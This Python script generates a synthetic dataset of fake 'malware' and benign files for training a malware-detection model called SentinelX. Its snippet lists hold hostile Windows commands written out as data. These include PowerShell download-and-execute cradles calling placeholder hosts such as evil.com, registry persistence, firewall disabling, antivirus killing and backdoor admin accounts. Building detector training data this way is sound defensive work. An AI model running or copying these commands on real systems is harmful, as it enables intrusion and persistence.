"""
Synthetic dataset generator for SentinelX ML model.

Since we can't ship actual malware samples, we generate realistic
synthetic files that have the same statistical fingerprint as real
malware and benign files.

The key insight: we don't need real malware — we need files whose
*feature vectors* resemble real malware. Obfuscated scripts, high
entropy payloads, and suspicious command strings all produce the
same numeric signature as the real thing.
"""

import os
import random
import string
import base64
import math

# ---------------------------------------------------------------------------
# Safe file templates
# ---------------------------------------------------------------------------

SAFE_TEXTS = [
    # config files
    "# Configuration file\nhost=localhost\nport=8080\ndebug=false\nlog_level=info\n",
    "[settings]\ntheme=dark\nlanguage=en\nfont_size=14\nautosave=true\n",
    "version: 1.0\nauthor: user\ndescription: project settings\ncreated: 2024\n",

    # readme / docs
    "# Project README\n\nThis project implements a file scanner.\n\nUsage:\n  python main.py\n\nLicense: MIT\n",
    "Installation guide\n==================\n1. Install Python 3.10+\n2. Run pip install -r requirements.txt\n3. Start the application\n",

    # source code (benign)
    "def calculate_total(items):\n    return sum(item.price for item in items)\n\nclass ShoppingCart:\n    def __init__(self):\n        self.items = []\n",
    "import os\nimport sys\n\ndef main():\n    print('Hello, world')\n    return 0\n\nif __name__ == '__main__':\n    main()\n",
    "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => res.send('OK'));\napp.listen(3000);\n",

    # log files
    "[2024-01-15 10:23:41] INFO Application started\n[2024-01-15 10:23:42] INFO Database connected\n[2024-01-15 10:23:43] INFO Server listening on port 8080\n",

    # data files
    "name,age,city\nAlice,30,New York\nBob,25,London\nCarol,35,Tokyo\n",
    "product_id,price,quantity\n1001,19.99,50\n1002,34.50,20\n1003,9.99,100\n",
]

SAFE_EXTENSIONS = [".txt", ".cfg", ".ini", ".log", ".csv", ".py", ".js", ".md", ".json", ".xml"]


def _make_safe_file(path):
    content = random.choice(SAFE_TEXTS)
    # add some random lines to vary file size
    extras = random.randint(0, 20)
    for _ in range(extras):
        content += f"# line {random.randint(100, 999)}: {random.choice(string.ascii_letters) * random.randint(5, 30)}\n"
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


# ---------------------------------------------------------------------------
# Malware file templates
# ---------------------------------------------------------------------------

MALWARE_POWERSHELL_SNIPPETS = [
    "powershell -hidden -command \"iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"",
    "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc {b64}",
    "powershell -command \"$client = New-Object System.Net.WebClient; $client.DownloadFile('http://c2.site/update.exe', $env:TEMP+'\\\\update.exe')\"",
    "Start-Process powershell -ArgumentList '-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"http://malware.xyz/shell\"))'",
]

MALWARE_REG_SNIPPETS = [
    "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d malware.bat /f",
    "reg add HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell /d explorer.exe,backdoor.exe",
    "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile /f",
]

MALWARE_CMD_SNIPPETS = [
    "taskkill /F /IM antivirus.exe /T",
    "net user administrator hacked123 /add",
    "net localgroup administrators hacker /add",
    "netsh advfirewall set allprofiles state off",
    "attrib +h +s +r malware.exe",
    "schtasks /create /sc minute /mo 5 /tn \"WindowsUpdate\" /tr malware.bat",
    "certutil -decode encoded.txt payload.exe",
    "bitsadmin /transfer job /download /priority high http://evil.com/rat.exe %temp%\\rat.exe",
]

MALWARE_WSCRIPT_SNIPPETS = [
    "Set objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd.exe /c \" & payload, 0, False",
    "Dim oHTTP: Set oHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\noHTTP.open \"GET\", \"http://c2.server/config\", False\noHTTP.send",
    "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil\", \"malware.vbs\"",
]

MALWARE_EXTENSIONS = [".bat", ".vbs", ".ps1", ".cmd", ".exe"]


def _make_b64_blob(length=60):
    """Generate a realistic base64-encoded 'payload'."""
    raw = os.urandom(length)
    return base64.b64encode(raw).decode("ascii")


def _make_malware_file(path):
    ext = os.path.splitext(path)[1].lower()
    lines = []

    if ext in (".bat", ".cmd"):
        lines.append("@echo off")
        lines.append(":: Windows batch script")
        lines += random.choices(MALWARE_CMD_SNIPPETS, k=random.randint(2, 5))
        lines += random.choices(MALWARE_POWERSHELL_SNIPPETS, k=random.randint(1, 3))
        for snip in lines:
            if "{b64}" in snip:
                lines[lines.index(snip)] = snip.replace("{b64}", _make_b64_blob())

    elif ext == ".vbs":
        lines.append("' VBScript")
        lines += random.choices(MALWARE_WSCRIPT_SNIPPETS, k=random.randint(2, 4))
        lines += random.choices(MALWARE_REG_SNIPPETS, k=random.randint(1, 2))

    elif ext in (".ps1",):
        lines.append("# PowerShell script")
        lines += random.choices(MALWARE_POWERSHELL_SNIPPETS, k=random.randint(2, 4))
        lines.append(f"$payload = \"{_make_b64_blob(80)}\"")
        lines.append("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload)) | iex")

    else:  # .exe placeholder — binary-like high-entropy content
        lines.append(f"MZ_HEADER_{_make_b64_blob(100)}")
        lines += random.choices(MALWARE_CMD_SNIPPETS + MALWARE_POWERSHELL_SNIPPETS, k=random.randint(3, 6))

    # add random padding to vary sizes
    for _ in range(random.randint(0, 10)):
        lines.append(f":: {_make_b64_blob(random.randint(20, 50))}")

    content = "\n".join(lines)
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate_dataset(
    output_dir: str,
    n_malware: int = 300,
    n_safe: int = 300,
    seed: int = 42,
) -> tuple[str, str]:
    """
    Generates synthetic malware and safe files.
    Returns (malware_dir, safe_dir).
    """
    random.seed(seed)

    malware_dir = os.path.join(output_dir, "malware")
    safe_dir    = os.path.join(output_dir, "safe")
    os.makedirs(malware_dir, exist_ok=True)
    os.makedirs(safe_dir,    exist_ok=True)

    for i in range(n_malware):
        ext  = random.choice(MALWARE_EXTENSIONS)
        name = f"malware_{i:04d}{ext}"
        _make_malware_file(os.path.join(malware_dir, name))

    for i in range(n_safe):
        ext  = random.choice(SAFE_EXTENSIONS)
        name = f"safe_{i:04d}{ext}"
        _make_safe_file(os.path.join(safe_dir, name))

    return malware_dir, safe_dir


if __name__ == "__main__":
    mal_dir, safe_dir = generate_dataset("ai/dataset")
    mal_count  = len(os.listdir(mal_dir))
    safe_count = len(os.listdir(safe_dir))
    print(f"Generated {mal_count} malware samples → {mal_dir}")
    print(f"Generated {safe_count} safe samples   → {safe_dir}")
